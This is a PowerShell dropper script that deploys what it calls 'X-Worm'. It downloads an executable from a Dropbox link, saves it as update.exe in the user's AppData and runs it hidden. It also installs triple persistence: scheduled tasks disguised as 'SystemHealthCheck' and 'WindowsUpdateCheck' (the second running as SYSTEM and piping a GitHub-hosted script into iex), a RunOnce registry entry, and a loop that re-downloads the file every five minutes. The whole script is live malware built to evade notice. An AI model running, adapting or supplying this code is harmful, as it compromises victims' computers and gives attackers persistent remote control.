$url = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
$githubUrl = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'

Write-Host "🎯 Perfect stealth deploy (Zero errors + No PowerShell visible)..."

# CLEANUP (Fixed syntax)
Get-Process | ? Name -like "*update*" | Stop-Process -Force -EA 0 2>$null
schtasks /delete /tn *Health* /f 2>$null
schtasks /delete /tn Sys* /f 2>$null

# X-WORM
$wormPath = "$env:APPDATA\update.exe"
$bytes = (New-Object Net.WebClient).DownloadData($url)
[IO.File]::WriteAllBytes($wormPath, $bytes)
Start-Process $wormPath -WindowStyle Hidden
Write-Host "✅ X-Worm: $wormPath ($(($bytes.Length)/1KB)KB)"

# TASK SCHEDULER METHOD (PowerShell NOT visible in startup)
$taskName = "SystemHealthCheck"
$taskCmd = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& {`$u='$url';`$p='$wormPath';while(`$true){Start-Sleep 300;if(!(Test-Path `$p)){(New-Object Net.WebClient).DownloadData(`$u)|Set-Content `$p -Enc Byte;Start-Process `$p -WindowStyle Hidden}}}`""
schtasks /create /tn $taskName /tr $taskCmd /sc onlogon /rl highest /f 2>$null
Write-Host "✅ Task Scheduler: $taskName (Hidden PowerShell)"

# RUNONCE BACKUP (Double persistence)
$monitorCmd = 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "& {`$u=''' + $url + ''';`$p=''' + $wormPath + ''';while(`$true){Start-Sleep 300;if(!(Test-Path `$p)){(New-Object Net.WebClient).DownloadData(`$u)|Set-Content `$p -Enc Byte;Start-Process `$p -WindowStyle Hidden}}}"'
Set-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "SysUpdate" -Value $monitorCmd -Force
Write-Host "✅ RunOnce backup: SysUpdate"

# IMMEDIATE MONITOR (Background)
Start-Process "powershell" -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& {`$u='$url';`$p='$wormPath';while(`$true){Start-Sleep 300;if(!(Test-Path `$p)){(New-Object Net.WebClient).DownloadData(`$u)|Set-Content `$p -Enc Byte;Start-Process `$p -WindowStyle Hidden}}}`"" -WindowStyle Hidden

# 🔥 NEW: GITHUB SELF-LOADER (Complete Hide)
$githubLoader = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr '$githubUrl' | iex`""
schtasks /create /tn "WindowsUpdateCheck" /tr $githubLoader /sc onlogon /rl highest /ru SYSTEM /f 2>$null
Write-Host "✅ GitHub Loader: WindowsUpdateCheck (Full Script on Startup)"

Write-Host "🎉 ✅ TRIPLE PERSISTENCE LIVE"
Write-Host "📍 X-Worm: $wormPath → Running"
Write-Host "📍 Task: $taskName → File Monitor"
Write-Host "📍 GitHub: WindowsUpdateCheck → Full Script Reload"
Write-Host "🔄 REBOOT → 100% RECOVERY"
